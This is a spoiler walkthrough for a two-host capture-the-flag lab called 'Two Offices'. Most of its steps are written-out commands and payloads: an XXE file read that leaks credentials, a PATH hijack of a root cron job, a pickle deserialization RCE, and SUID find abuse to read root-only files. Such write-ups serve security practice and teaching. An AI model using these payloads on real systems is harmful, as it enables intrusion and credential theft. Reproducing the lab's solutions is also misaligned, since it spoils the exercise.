# Writeup — Two Offices (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. View-source `/` → HTML comment.
2. `curl -d "username=branch_staff&password=branch2024" http://TARGET:8004/login` → flag 2.
3. XXE:
   ```
   curl -X POST -H "Content-Type: application/xml" http://TARGET:8004/import-schedule --data-binary \
     '<?xml version="1.0"?><!DOCTYPE schedule [<!ENTITY xxe SYSTEM "file:///opt/frontdesk/secret/flag3.txt">]><schedule><name>&xxe;</name></schedule>'
   ```
   → flag 3.
4. Same technique, different file: `file:///opt/frontdesk/secret/creds.txt`
   → `clerk:Cl3rk-Front2024!`. Then
   `ssh -p 2204 clerk@TARGET` → `cat flag4.txt`.
5. As clerk: `cat /etc/cron.d/*` shows
   `PATH=/opt/admin/bin:/usr/bin:/bin` and a job running
   `/opt/admin/daily_report.sh` as root every minute; that script calls
   `backup-helper` by bare name. `/opt/admin/bin` is world-writable
   (`ls -la /opt/admin`). Drop a malicious `backup-helper` there:
   ```
   cat > /opt/admin/bin/backup-helper <<'EOF'
   #!/bin/bash
   mkdir -p /tmp/loot
   cp /root/secret/* /tmp/loot/
   chmod 644 /tmp/loot/*
   EOF
   chmod +x /opt/admin/bin/backup-helper
   ```
   Wait up to a minute, then `cat /tmp/loot/flag5.txt` → flag 5, and
   `/tmp/loot/fragmentA.txt` (needed for flag 10), and
   `backoffice_notes.txt` confirming the second host's hostname.
6. From the clerk SSH session (this only works from inside Front Desk):
   `curl http://backoffice:6000/` → flag 6.
7. Insecure deserialization. From Python, build a pickle whose
   `__reduce__` runs code on load:
   ```python
   import pickle, base64
   class E:
       def __reduce__(self):
           return (eval, ("open('/opt/backoffice/secret/flag7.txt').read()",))
   print(base64.b64encode(pickle.dumps(E())).decode())
   ```
   Then, from the clerk SSH session:
   `curl -X POST --data-urlencode "data=<payload>" http://backoffice:6000/api/process`
   → the file's contents (flag 7) reflected back in the response.
8. Same technique, `/opt/backoffice/secret/flag8.txt` → flag 8.
9. The RCE runs as the unprivileged `svc` account, not root. Check for
   SUID binaries: a payload running
   `find / -perm -4000 -type f 2>/dev/null` (via the same pickle RCE)
   shows `find` itself is SUID root. Use it:
   ```python
   cmd = r'find /root/secret/flag9.txt -exec cat {} /root/secret/fragmentB.txt \; > /tmp/root_loot.txt; chmod 644 /tmp/root_loot.txt'
   # os.system(cmd) via the same __reduce__ pattern as above, then read /tmp/root_loot.txt the same way
   ```
   → flag 9, and `fragmentB`.
10. Combine both fragments (concatenated, A then B) as the passphrase:
    ```
    curl http://TARGET:8004/final.enc -o final.enc
    python3 docker/flagcrypto.py decrypt "<fragmentA><fragmentB>" final.enc -
    ```
    → flag 10.

## Honeypots encountered (intentional, cost time only)
- Front Desk `/admin` — a plausible path, 501, nothing behind it.
- Front Desk XXE target `old_backup.txt` — explicitly inert decoy creds.
- Back Office `/ops-portal` — a real response, no useful path forward;
  the `ops` Linux account it implies exists but has no valid credential.
